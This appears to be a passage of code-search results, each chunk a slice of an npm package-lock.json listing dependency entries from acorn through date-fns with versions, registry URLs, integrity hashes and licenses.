\"sha512-2BjRTZxTPvheOvGbBslFSYOUkr+SjPtOnrLP33f+VIWLzezQpZcqVg7ja3L4dBXmzzgwT+a029jRx5PCi3JuiA==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/acorn\": {\n      \"version\": \"8.15.0\",\n      \"resolved\": \"https://registry.npmjs.org/acorn/-/acorn-8.15.0.tgz\",\n      \"integrity\": \"sha512-NZyJarBfL7nWwIq+FDL6Zp/yHEhePMNnnJ0y3qfieCrmNvYct8uvtiV41UvlSe6apAfk0fY1FbWx+NwfmpvtTg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"bin\": {\n        \"acorn\": \"bin/acorn\"\n      },\n      \"engines\": {\n        \"node\": \">=0.4.0\"\n      }\n    },\n    \"node_modules/acorn-walk\": {\n      \"version\": \"8.3.4\",\n      \"resolved\": \"https://registry.npmjs.org/acorn-walk/-/acorn-walk-8.3.4.tgz\",\n      \"integrity\": \"sha512-ueEepnujpqee2o5aIYnvHU6C0A42MNdsIDeqy5BydrkuC5R1ZuUFnm27EeFJGoEHJQgn3uleRvmTXaJgfXbt4g==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"acorn\": \"^8.11.0\"\n      },\n      \"engines\": {\n        \"node\": \">=0.4.0\"\n      }\n    },\n    \"node_modules/agent-base\": {\n      \"version\": \"6.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/agent-base/-/agent-base-6.0.2.tgz\",\n      \"integrity\": \"sha512-RZNwNclF7+MS/8bDg70amg32dyeZGZxiDuQmZxKLAlQjr3jGyLx+4Kkk58UO7D2QdgFIQCovuSuZESne6RG6XQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"debug\": \"4\"\n      },\n      \"engines\": {\n        \"node\": \">= 6.0.0\"\n      }\n    },\n    \"node_modules/ajv\": {\n      \"version\": \"8.17.1\",\n      \"resolved\": \"https://registry.npmjs.org/ajv/-/ajv-8.17.1.tgz\",\n      \"integrity\": \"sha512-B/gBuNg5SiMTrPkC+A2+cW0RszwxYmn6VYxB/inlBStS5nx6xHIt/ehKRhIMhqusl7a8LjQoZnjCs5vhwxOQ1g==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"fast-deep-equal\": \"^3.1.3\",\n        \"fast-uri\": \"^3.0.1\",\n        \"json-schema-traverse\": \"^1.0.0\",\n        \"require-from-string\": \"^2.0.2\"\n      },\n      \"funding\": {\n        \"type\": \"github\",\n        \"url\": \"https://github.com/sponsors/epoberezkin\"\n      }\n    },\n    \"node_modules/ajv-formats\": {\n      \"version\": \"2.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/ajv-formats/-/ajv-formats-2.1.1.tgz\",\n      \"integrity\": \"sha512-Wx0Kx52hxE7C18hkMEggYlEifqWZtYaRgouJor+WMdPnQyEK13vgEWyVNup7SoeeoLMsr4kf5h6dOW11I15MUA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ajv\": \"^8.0.0\"\n      },\n      \"peerDependencies\": {\n        \"ajv\": \"^8.0.0\"\n      },\n      \"peerDependenciesMeta\": {\n        \"ajv\": {\n          \"optional\": true\n        }\n      }\n    },\n    \"node_modules/ajv/node_modules/fast-uri\": {\n      \"version\": \"3.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/fast-uri/-/fast-uri-3.1.0.tgz\",\n      \"integrity\": \"sha512-iPeeDKJSWf4IEOasVVrknXpaBV0IApz/gp7S2bb7Z4Lljbl2MGJRqInZiUrQwV16cpzw/D3S5j5Julj/gT52AA==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/fastify\"\n        },\n        {\n          \"type\": \"opencollective\",\n          \"url\": \"https://opencollective.com/fastify\"\n        }\n      ],\n      \"license\": \"BSD-3-Clause\"\n    },\n    \"node_modules/ansi-regex\": {\n      \"version\": \"5.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/ansi-regex/-/ansi-regex-5.0.1.tgz\",\n      \"integrity\": \"sha512-quJQXlTSUGL2LH9SUXo8VwsY4soanhgo6LNSm84E1LBcE8s3O0wpdiRzyR9z/ZZJMlMWv37qOOb9pdJlMUEKFQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/ansi-styles\": {\n      \"version\": \"4.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/ansi-styles/-/ansi-styles-4.3.0.tgz\",\n      \"integrity\": \"sha512-zbB9rCJAT1rbjiVDb2hqKFHNYLxgtk8NURxZ3IZwD3F6NtxbXZQCnnSi1Lkx+IDohdPlFp222wVALIheZJQSEg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"color-convert\": \"^2.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">=8\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/chalk/ansi-styles?sponsor=1\"\n      }\n    },\n    \"node_modules/aproba\": {\n      \"version\": \"2.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/aproba/-/aproba-2.1.0.tgz\",\n      \"integrity\": \"sha512-tLIEcj5GuR2RSTnxNKdkK0dJ/GrC7P38sUkiDmDuHfsHmbagTFAxDVIBltoklXEVIQ/f14IL8IMJ5pn9Hez1Ew==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/are-we-there-yet\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/are-we-there-yet/-/are-we-there-yet-2.0.0.tgz\",\n      \"integrity\": \"sha512-Ci/qENmwHnsYo9xKIcUJN5LeDKdJ6R1Z1j9V/J5wyq8nh/mYPEpIKJbBZXtZjG04HiK7zV/p6Vs9952MrMeUIw==\",\n      \"deprecated\": \"This package is no longer supported.\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"delegates\": \"^1.0.0\",\n        \"readable-stream\": \"^3.6.0\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/argon2\": {\n      \"version\": \"0.31.2\",\n      \"resolved\": \"https://registry.npmjs.org/argon2/-/argon2-0.31.2.tgz\",\n      \"integrity\": \"sha512-QSnJ8By5Mth60IEte45w9Y7v6bWcQw3YhRtJKKN8oNCxnTLDiv/AXXkDPf2srTMfxFVn3QJdVv2nhXESsUa+Yg==\",\n      \"hasInstallScript\": true,", "metadata": {"file": "package-lock.json", "start_line": 1801, "end_line": 2000, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:2001", "score": 0.0, "content": "      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@mapbox/node-pre-gyp\": \"^1.0.11\",\n        \"@phc/format\": \"^1.0.0\",\n        \"node-addon-api\": \"^7.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=14.0.0\"\n      }\n    },\n    \"node_modules/assertion-error\": {\n      \"version\": \"1.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/assertion-error/-/assertion-error-1.1.0.tgz\",\n      \"integrity\": \"sha512-jgsaNduz+ndvGyFt3uSuWqvy4lCnIJiovtouQN5JZHOKCS2QuhEdbcQHFhVksz2N2U9hXJo8odG7ETyWlEeuDw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \"*\"\n      }\n    },\n    \"node_modules/asynckit\": {\n      \"version\": \"0.4.0\",\n      \"resolved\": \"https://registry.npmjs.org/asynckit/-/asynckit-0.4.0.tgz\",\n      \"integrity\": \"sha512-Oei9OH4tRh0YqU3GxhX79dM/mwVgvbZJaSNaRk+bshkj0S5cfHcgYakreBjrHwatXKbz+IoIdYLxrKim2MjW0Q==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/atomic-sleep\": {\n      \"version\": \"1.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/atomic-sleep/-/atomic-sleep-1.0.0.tgz\",\n      \"integrity\": \"sha512-kNOjDqAh7px0XWNI+4QbzoiR/nTkHAWNud2uvnJquD1/x5a7EQZMJT0AczqK0Qn67oY/TTQ1LbUKajZpp3I9tQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=8.0.0\"\n      }\n    },\n    \"node_modules/avvio\": {\n      \"version\": \"8.4.0\",\n      \"resolved\": \"https://registry.npmjs.org/avvio/-/avvio-8.4.0.tgz\",\n      \"integrity\": \"sha512-CDSwaxINFy59iNwhYnkvALBwZiTydGkOecZyPkqBpABYR1KqGEsET0VOOYDwtleZSUIdeY36DC2bSZ24CO1igA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@fastify/error\": \"^3.3.0\",\n        \"fastq\": \"^1.17.1\"\n      }\n    },\n    \"node_modules/avvio/node_modules/@fastify/error\": {\n      \"version\": \"3.4.1\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/error/-/error-3.4.1.tgz\",\n      \"integrity\": \"sha512-wWSvph+29GR783IhmvdwWnN4bUxTD01Vm5Xad4i7i1VuAOItLvbPAb69sb0IQ2N57yprvhNIwAP5B6xfKTmjmQ==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/balanced-match\": {\n      \"version\": \"1.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/balanced-match/-/balanced-match-1.0.2.tgz\",\n      \"integrity\": \"sha512-3oSeUO0TMV67hN1AmbXsK4yaqU7tjiHlbxRDZOpH0KW9+CeX4bRAaX0Anxt0tx2MrpRpWwQaPwIlISEJhYU5Pw==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/base64-js\": {\n      \"version\": \"1.5.1\",\n      \"resolved\": \"https://registry.npmjs.org/base64-js/-/base64-js-1.5.1.tgz\",\n      \"integrity\": \"sha512-AKpaYlHn8t4SVbOHCy+b5+KKgvR4vrsD8vbvrbiQJps7fKDTkjkDry6ji0rUJjC0kzbNePLwzxq8iypo41qeWA==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/feross\"\n        },\n        {\n          \"type\": \"patreon\",\n          \"url\": \"https://www.patreon.com/feross\"\n        },\n        {\n          \"type\": \"consulting\",\n          \"url\": \"https://feross.org/support\"\n        }\n      ],\n      \"license\": \"MIT\"\n    },\n    \"node_modules/baseline-browser-mapping\": {\n      \"version\": \"2.9.18\",\n      \"resolved\": \"https://registry.npmjs.org/baseline-browser-mapping/-/baseline-browser-mapping-2.9.18.tgz\",\n      \"integrity\": \"sha512-e23vBV1ZLfjb9apvfPk4rHVu2ry6RIr2Wfs+O324okSidrX7pTAnEJPCh/O5BtRlr7QtZI7ktOP3vsqr7Z5XoA==\",\n      \"dev\": true,\n      \"license\": \"Apache-2.0\",\n      \"bin\": {\n        \"baseline-browser-mapping\": \"dist/cli.js\"\n      }\n    },\n    \"node_modules/better-sqlite3\": {\n      \"version\": \"11.10.0\",\n      \"resolved\": \"https://registry.npmjs.org/better-sqlite3/-/better-sqlite3-11.10.0.tgz\",\n      \"integrity\": \"sha512-EwhOpyXiOEL/lKzHz9AW1msWFNzGc/z+LzeB3/jnFJpxu+th2yqvzsSWas1v9jgs9+xiXJcD5A8CJxAG2TaghQ==\",\n      \"hasInstallScript\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"bindings\": \"^1.5.0\",\n        \"prebuild-install\": \"^7.1.1\"\n      }\n    },\n    \"node_modules/bindings\": {\n      \"version\": \"1.5.0\",\n      \"resolved\": \"https://registry.npmjs.org/bindings/-/bindings-1.5.0.tgz\",\n      \"integrity\": \"sha512-p2q/t/mhvuOj/UeLlV6566GD/guowlr0hHxClI0W9m7MWYkL1F0hLo+0Aexs9HSPCtR1SXQ0TD3MMKrXZajbiQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"file-uri-to-path\": \"1.0.0\"\n      }\n    },\n    \"node_modules/bl\": {\n      \"version\": \"4.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/bl/-/bl-4.1.0.tgz\",\n      \"integrity\": \"sha512-1W07cM9gS6DcLperZfFSj+bWLtaPGSOHWhPiGzXmvVJbRLdG82sH/Kn8EtW1VqWVA54AKf2h5k5BbnIbwF3h6w==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"buffer\": \"^5.5.0\",\n        \"inherits\": \"^2.0.4\",\n        \"readable-stream\": \"^3.4.0\"\n      }\n    },\n    \"node_modules/brace-expansion\": {\n      \"version\": \"2.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/brace-expansion/-/brace-expansion-2.0.2.tgz\",\n      \"integrity\": \"sha512-Jt0vHyM+jmUBqojB7E1NIYadt0vI0Qxjxd2TErW94wDz+E2LAm5vKMXXwg6ZZBTHPuUlDgQHKXvjGBdfcF1ZDQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"balanced-match\": \"^1.0.0\"\n      }\n    },\n    \"node_modules/browserslist\": {\n      \"version\": \"4.28.1\",\n      \"resolved\": \"https://registry.npmjs.org/browserslist/-/browserslist-4.28.1.tgz\",\n      \"integrity\": \"sha512-ZC5Bd0LgJXgwGqUknZY/vkUQ04r8NXnJZ3yYi4vDmSiZmC/pdSN0NbNRPxZpbtO4uAfDUAFffO8IZoM3Gj8IkA==\",\n      \"dev\": true,\n      \"funding\": [\n        {\n          \"type\": \"opencollective\",\n          \"url\": \"https://opencollective.com/browserslist\"\n        },\n        {\n          \"type\": \"tidelift\",\n          \"url\": \"https://tidelift.com/funding/github/npm/browserslist\"\n        },\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/ai\"\n        }\n      ],\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"baseline-browser-mapping\": \"^2.9.0\",\n        \"caniuse-lite\": \"^1.0.30001759\",\n        \"electron-to-chromium\": \"^1.5.263\",\n        \"node-releases\": \"^2.0.27\",\n        \"update-browserslist-db\": \"^1.2.0\"\n      },\n      \"bin\": {\n        \"browserslist\": \"cli.js\"\n      },\n      \"engines\": {\n        \"node\": \"^6 || ^7 || ^8 || ^9 || ^10 || ^11 || ^12 || >=13.7\"\n      }\n    },\n    \"node_modules/buffer\": {\n      \"version\": \"5.7.1\",\n      \"resolved\": \"https://registry.npmjs.org/buffer/-/buffer-5.7.1.tgz\",\n      \"integrity\": \"sha512-EHcyIPBQ4BSGlvjB16k5KgAJ27CIsHY/2JBmCRReo48y9rQ3MaUzWX3KVlBa4U7MyX02HdVj0K7C3WaB3ju7FQ==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/feross\"\n        },\n        {\n          \"type\": \"patreon\",\n          \"url\": \"https://www.patreon.com/feross\"\n        },\n        {\n          \"type\": \"consulting\",\n          \"url\": \"https://feross.org/support\"\n        }\n      ],\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"base64-js\": \"^1.3.1\",\n        \"ieee754\": \"^1.1.13\"\n      }\n    },\n    \"node_modules/cac\": {\n      \"version\": \"6.7.14\",\n      \"resolved\": \"https://registry.npmjs.org/cac/-/cac-6.7.14.tgz\",\n      \"integrity\": \"sha512-b6Ilus+c3RrdDk+JhLKUAQfzzgLEPy6wcXqS7f/xe1EETvsDP6GORG7SFuOs6cID5YkqchW/LXZbX5bc8j7ZcQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/call-bind-apply-helpers\": {\n      \"version\": \"1.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/call-bind-apply-helpers/-/call-bind-apply-helpers-1.0.2.tgz\",\n      \"integrity\": \"sha512-Sp1ablJ0ivDkSzjcaJdxEunN5/XvksFJ2sMBFfq6x0ryhQV/2b/KwFe21cMpmHtPOSij8K99/wSfoEuTObmuMQ==\",\n      \"license\": \"MIT\",", "metadata": {"file": "package-lock.json", "start_line": 2001, "end_line": 2200, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:2201", "score": 0.0, "content": "      \"dependencies\": {\n        \"es-errors\": \"^1.3.0\",\n        \"function-bind\": \"^1.1.2\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.4\"\n      }\n    },\n    \"node_modules/caniuse-lite\": {\n      \"version\": \"1.0.30001766\",\n      \"resolved\": \"https://registry.npmjs.org/caniuse-lite/-/caniuse-lite-1.0.30001766.tgz\",\n      \"integrity\": \"sha512-4C0lfJ0/YPjJQHagaE9x2Elb69CIqEPZeG0anQt9SIvIoOH4a4uaRl73IavyO+0qZh6MDLH//DrXThEYKHkmYA==\",\n      \"dev\": true,\n      \"funding\": [\n        {\n          \"type\": \"opencollective\",\n          \"url\": \"https://opencollective.com/browserslist\"\n        },\n        {\n          \"type\": \"tidelift\",\n          \"url\": \"https://tidelift.com/funding/github/npm/caniuse-lite\"\n        },\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/ai\"\n        }\n      ],\n      \"license\": \"CC-BY-4.0\"\n    },\n    \"node_modules/chai\": {\n      \"version\": \"4.5.0\",\n      \"resolved\": \"https://registry.npmjs.org/chai/-/chai-4.5.0.tgz\",\n      \"integrity\": \"sha512-RITGBfijLkBddZvnn8jdqoTypxvqbOLYQkGGxXzeFjVHvudaPw0HNFD9x928/eUwYWd2dPCugVqspGALTZZQKw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"assertion-error\": \"^1.1.0\",\n        \"check-error\": \"^1.0.3\",\n        \"deep-eql\": \"^4.1.3\",\n        \"get-func-name\": \"^2.0.2\",\n        \"loupe\": \"^2.3.6\",\n        \"pathval\": \"^1.1.1\",\n        \"type-detect\": \"^4.1.0\"\n      },\n      \"engines\": {\n        \"node\": \">=4\"\n      }\n    },\n    \"node_modules/chalk\": {\n      \"version\": \"4.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/chalk/-/chalk-4.1.2.tgz\",\n      \"integrity\": \"sha512-oKnbhFyRIXpUuez8iBMmyEa4nbj4IOQyuhc/wy9kY7/WVPcwIO9VA668Pu8RkO7+0G76SLROeyw9CpQ061i4mA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ansi-styles\": \"^4.1.0\",\n        \"supports-color\": \"^7.1.0\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/chalk/chalk?sponsor=1\"\n      }\n    },\n    \"node_modules/chalk/node_modules/supports-color\": {\n      \"version\": \"7.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/supports-color/-/supports-color-7.2.0.tgz\",\n      \"integrity\": \"sha512-qpCAvRl9stuOHveKsn7HncJRvv501qIacKzQlO/+Lwxc9+0q2wLyv4Dfvt80/DPn2pqOBsJdDiogXGR9+OvwRw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"has-flag\": \"^4.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/check-error\": {\n      \"version\": \"1.0.3\",\n      \"resolved\": \"https://registry.npmjs.org/check-error/-/check-error-1.0.3.tgz\",\n      \"integrity\": \"sha512-iKEoDYaRmd1mxM90a2OEfWhjsjPpYPuQ+lMYsoxB126+t8fw7ySEO48nmDg5COTjxDI65/Y2OWpeEHk3ZOe8zg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"get-func-name\": \"^2.0.2\"\n      },\n      \"engines\": {\n        \"node\": \"*\"\n      }\n    },\n    \"node_modules/chownr\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/chownr/-/chownr-2.0.0.tgz\",\n      \"integrity\": \"sha512-bIomtDF5KGpdogkLd9VspvFzk9KfpyyGlS8YFVZl7TGPBHL5snIOnxeshwVgPteQ9b4Eydl+pVbIyE1DcvCWgQ==\",\n      \"license\": \"ISC\",\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/cliui\": {\n      \"version\": \"8.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/cliui/-/cliui-8.0.1.tgz\",\n      \"integrity\": \"sha512-BSeNnyus75C4//NQ9gQt1/csTXyo/8Sb+afLAkzAptFuMsod9HFokGNudZpi/oQV73hnVK+sR+5PVRMd+Dr7YQ==\",\n      \"dev\": true,\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"string-width\": \"^4.2.0\",\n        \"strip-ansi\": \"^6.0.1\",\n        \"wrap-ansi\": \"^7.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/color-convert\": {\n      \"version\": \"2.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/color-convert/-/color-convert-2.0.1.tgz\",\n      \"integrity\": \"sha512-RRECPsj7iu/xb5oKYcsFHSppFNnsj/52OVTRKb4zP5onXwVF3zVmmToNcOfGC+CRDpfK/U584fMg38ZHCaElKQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"color-name\": \"~1.1.4\"\n      },\n      \"engines\": {\n        \"node\": \">=7.0.0\"\n      }\n    },\n    \"node_modules/color-name\": {\n      \"version\": \"1.1.4\",\n      \"resolved\": \"https://registry.npmjs.org/color-name/-/color-name-1.1.4.tgz\",\n      \"integrity\": \"sha512-dOy+3AuW3a2wNbZHIuMZpTcgjGuLU/uBL/ubcZF9OXbDo8ff4O8yVp5Bf0efS8uEoYo5q4Fx7dY9OgQGXgAsQA==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/color-support\": {\n      \"version\": \"1.1.3\",\n      \"resolved\": \"https://registry.npmjs.org/color-support/-/color-support-1.1.3.tgz\",\n      \"integrity\": \"sha512-qiBjkpbMLO/HL68y+lh4q0/O1MZFj2RX6X/KmMa3+gJD3z+WwI1ZzDHysvqHGS3mP6mznPckpXmw1nI9cJjyRg==\",\n      \"license\": \"ISC\",\n      \"bin\": {\n        \"color-support\": \"bin.js\"\n      }\n    },\n    \"node_modules/colorette\": {\n      \"version\": \"2.0.20\",\n      \"resolved\": \"https://registry.npmjs.org/colorette/-/colorette-2.0.20.tgz\",\n      \"integrity\": \"sha512-IfEDxwoWIjkeXL1eXcDiow4UbKjhLdq6/EuSVR9GMN7KVH3r9gQ83e73hsz1Nd1T3ijd5xv1wcWRYO+D6kCI2w==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/combined-stream\": {\n      \"version\": \"1.0.8\",\n      \"resolved\": \"https://registry.npmjs.org/combined-stream/-/combined-stream-1.0.8.tgz\",\n      \"integrity\": \"sha512-FQN4MRfuJeHf7cBbBMJFXhKSDq+2kAArBlmRBvcvFE5BB1HZKXtSFASDhdlz9zOYwxh8lDdnvmMOe/+5cdoEdg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"delayed-stream\": \"~1.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.8\"\n      }\n    },\n    \"node_modules/commander\": {\n      \"version\": \"11.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/commander/-/commander-11.1.0.tgz\",\n      \"integrity\": \"sha512-yPVavfyCcRhmorC7rWlkHn15b4wDVgVmBA7kV4QVBsF7kv/9TKJAbAXVTxvTnwP8HHKjRCJDClKbciiYS7p0DQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=16\"\n      }\n    },\n    \"node_modules/concat-map\": {\n      \"version\": \"0.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/concat-map/-/concat-map-0.0.1.tgz\",\n      \"integrity\": \"sha512-/Srv4dswyQNBfohGpz9o6Yb3Gz3SrUDqBH5rTuhGR7ahtlbYKnVxw2bCFMRljaA7EXHaXZ8wsHdodFvbkhKmqg==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/concurrently\": {\n      \"version\": \"8.2.2\",\n      \"resolved\": \"https://registry.npmjs.org/concurrently/-/concurrently-8.2.2.tgz\",\n      \"integrity\": \"sha512-1dP4gpXFhei8IOtlXRE/T/4H88ElHgTiUzh71YUmtjTEHMSRS2Z/fgOxHSxxusGHogsRfxNq1vyAwxSC+EVyDg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"chalk\": \"^4.1.2\",\n        \"date-fns\": \"^2.30.0\",\n        \"lodash\": \"^4.17.21\",\n        \"rxjs\": \"^7.8.1\",\n        \"shell-quote\": \"^1.8.1\",\n        \"spawn-command\": \"0.0.2\",\n        \"supports-color\": \"^8.1.1\",\n        \"tree-kill\": \"^1.2.2\",\n        \"yargs\": \"^17.7.2\"\n      },\n      \"bin\": {\n        \"conc\": \"dist/bin/concurrently.js\",\n        \"concurrently\": \"dist/bin/concurrently.js\"\n      },\n      \"engines\": {\n        \"node\": \"^14.13.0 || >=16.0.0\"\n      },\n      \"funding\": {", "metadata": {"file": "package-lock.json", "start_line": 2201, "end_line": 2400, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:2401", "score": 0.0, "content": "        \"url\": \"https://github.com/open-cli-tools/concurrently?sponsor=1\"\n      }\n    },\n    \"node_modules/confbox\": {\n      \"version\": \"0.1.8\",\n      \"resolved\": \"https://registry.npmjs.org/confbox/-/confbox-0.1.8.tgz\",\n      \"integrity\": \"sha512-RMtmw0iFkeR4YV+fUOSucriAQNb9g8zFR52MWCtl+cCZOFRNL6zeB395vPzFhEjjn4fMxXudmELnl/KF/WrK6w==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/console-control-strings\": {\n      \"version\": \"1.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/console-control-strings/-/console-control-strings-1.1.0.tgz\",\n      \"integrity\": \"sha512-ty/fTekppD2fIwRvnZAVdeOiGd1c7YXEixbgJTNzqcxJWKQnjJ/V1bNEEE6hygpM3WjwHFUVK6HTjWSzV4a8sQ==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/content-disposition\": {\n      \"version\": \"0.5.4\",\n      \"resolved\": \"https://registry.npmjs.org/content-disposition/-/content-disposition-0.5.4.tgz\",\n      \"integrity\": \"sha512-FveZTNuGw04cxlAiWbzi6zTAL/lhehaWbTtgluJh4/E95DqMwTmha3KZN1aAWA8cFIhHzMZUvLevkw5Rqk+tSQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"safe-buffer\": \"5.2.1\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.6\"\n      }\n    },\n    \"node_modules/convert-source-map\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/convert-source-map/-/convert-source-map-2.0.0.tgz\",\n      \"integrity\": \"sha512-Kvp459HrV2FEJ1CAsi1Ku+MY3kasH19TFykTz2xWmMeq6bk2NU3XXvfJ+Q61m0xktWwt+1HSYf3JZsTms3aRJg==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/cookie\": {\n      \"version\": \"0.7.2\",\n      \"resolved\": \"https://registry.npmjs.org/cookie/-/cookie-0.7.2.tgz\",\n      \"integrity\": \"sha512-yki5XnKuf750l50uGTllt6kKILY4nQ1eNIQatoXEByZ5dWgnKqbnqmTrBE5B4N7lrMJKQ2ytWMiTO2o0v6Ew/w==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.6\"\n      }\n    },\n    \"node_modules/cookie-signature\": {\n      \"version\": \"1.2.2\",\n      \"resolved\": \"https://registry.npmjs.org/cookie-signature/-/cookie-signature-1.2.2.tgz\",\n      \"integrity\": \"sha512-D76uU73ulSXrD1UXF4KE2TMxVVwhsnCgfAyTg9k8P6KGZjlXKrOLe4dJQKI3Bxi5wjesZoFXJWElNWBjPZMbhg==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6.6.0\"\n      }\n    },\n    \"node_modules/cross-spawn\": {\n      \"version\": \"7.0.6\",\n      \"resolved\": \"https://registry.npmjs.org/cross-spawn/-/cross-spawn-7.0.6.tgz\",\n      \"integrity\": \"sha512-uV2QOWP2nWzsy2aMp8aRibhi9dlzF5Hgh5SHaB9OiTGEyDTiJJyx0uy51QXdyWbtAHNua4XJzUKca3OzKUd3vA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"path-key\": \"^3.1.0\",\n        \"shebang-command\": \"^2.0.0\",\n        \"which\": \"^2.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">= 8\"\n      }\n    },\n    \"node_modules/csstype\": {\n      \"version\": \"3.2.3\",\n      \"resolved\": \"https://registry.npmjs.org/csstype/-/csstype-3.2.3.tgz\",\n      \"integrity\": \"sha512-z1HGKcYy2xA8AGQfwrn0PAy+PB7X/GSj3UVJW9qKyn43xWa+gl5nXmU4qqLMRzWVLFC8KusUX8T/0kCiOYpAIQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/data-uri-to-buffer\": {\n      \"version\": \"4.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/data-uri-to-buffer/-/data-uri-to-buffer-4.0.1.tgz\",\n      \"integrity\": \"sha512-0R9ikRb668HB7QDxT1vkpuUBtqc53YyAwMwGeUFKRojY/NWKvdZ+9UYtRfGmhqNbRkTSVpMbmyhXipFFv2cb/A==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 12\"\n      }\n    },\n    \"node_modules/date-fns\": {\n      \"version\": \"2.30.0\",\n      \"resolved\": \"https://registry.npmjs.org/date-fns/-/date-fns-2.30.0.tgz\",\n      \"integrity\": \"sha512-fnULvOpxnC5/Vg3NCiWelDsLiUc9bRwAPs/+LfTLNvetFCtCTN+yQz15C/fs4AwX1R9K5GLtLfn8QW+dWisaAw==\",\n      \"dev\": true,\n     